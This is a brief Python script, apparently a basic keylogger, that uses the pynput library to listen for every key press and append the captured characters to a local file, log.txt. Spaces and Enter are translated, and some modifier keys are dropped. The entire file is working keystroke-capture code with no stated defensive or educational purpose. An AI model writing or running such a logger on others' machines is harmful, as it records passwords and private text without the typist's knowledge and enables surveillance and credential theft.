from pynput.keyboard import Listener

def writetofile(key):
    letter=str(key)
    # Ignore backspace key
    if letter == 'Key.backspace':
        letter = ""
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    letter=letter.replace("'","")
    with open('log.txt', 'a') as f:
        f.write(letter)



with Listener(on_press=writetofile) as l:
    l.join()
